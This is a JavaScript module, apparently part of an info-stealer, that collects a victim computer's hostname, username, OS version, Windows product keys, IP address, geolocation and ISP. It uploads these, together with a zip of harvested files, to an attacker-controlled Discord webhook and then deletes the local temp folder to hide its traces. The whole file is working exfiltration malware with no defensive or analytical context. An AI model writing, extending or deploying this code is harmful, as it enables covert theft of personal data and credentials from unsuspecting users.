const { webhook } = require('../config');
const { isValidURL } = require('../util/string');
const axios = require('axios');
const { join } = require('path');
const os = require('os');
const { filesize } = require('filesize');
const fs = require('fs');
const { tempFolder } = require('../index');
const FormData = require('form-data');
const { rmSync } = require('fs');

if (!webhook.url || typeof webhook.url !== 'string' || !isValidURL(webhook.url)) return;

const zipFile = fs.readdirSync(tempFolder).find(file => file.split('.').pop() === 'zip');
const json = async () => {
  const ipInfo = async (info) => await require('./ip-info').then(ip => ip[info]);
  const computerInfoFields = [
    ['RAM', filesize(Math.round(os.totalmem()))],
    ['Name', os.hostname()],
    ['Uptime', `<t:${Math.floor(Math.round(Date.now() / 1000) - os.uptime())}:R> (<t:${Math.floor(Math.round(Date.now() / 1000) - os.uptime())}:f>)`],
    ['Username', os.userInfo().username],
    ['OS version', os.version()],
    ['Product Key', `\`\`${require('./product-key').productKey}\`\``],
    ['Backup Product Key', `\`\`${require('./product-key').backupProductKey}\`\``],
  ];
  const ipInfoFields = [
    ['IP Address', `[${await ipInfo('query')}](<https://whatismyipaddress.com/ip/${await ipInfo('query')}>)`],
    ['Location', `[${await ipInfo('lat')}, ${await ipInfo('lon')}](<https://www.google.com/maps/search/?api=1&query=${await ipInfo('lat')}%2C${await ipInfo('lon')}>)`],
    ['ISP', `${await ipInfo('isp')}`],
  ];
  return {
    content: '@everyone',
    embeds: [
      {
        title: 'Computer info',
        fields: computerInfoFields.map(f => { return { name: f[0], value: f[1], inline: true }; })
      },
      {
        title: 'IP info',
        fields: ipInfoFields.map(f => { return { name: f[0], value: f[1], inline: true }; })
      },
    ],
    allowed_mentions: {
      parse: ['everyone'],
    },
    attachments: [
      {
        id: 0,
        filename: zipFile,
        description: 'A zip archive containing all the files.',
        content_type: 'application/zip',
        url: `attachment://${zipFile}`,
      }
    ]
  };
};

(async () => {
  const data = new FormData();
  data.append('files[0]', fs.createReadStream(join(tempFolder, zipFile)));
  data.append('payload_json', JSON.stringify(await json()));

  await axios.post(webhook.url, data, {
    headers: { 'Content-Type': 'multipart/form-data' },
  })
    .then(res => {
      if (res.status !== 200) return;
      // Zip sent to Discord webhook, now we can delete all the files
      rmSync(tempFolder, { recursive: true });
    })
    .catch(() => {});
})();
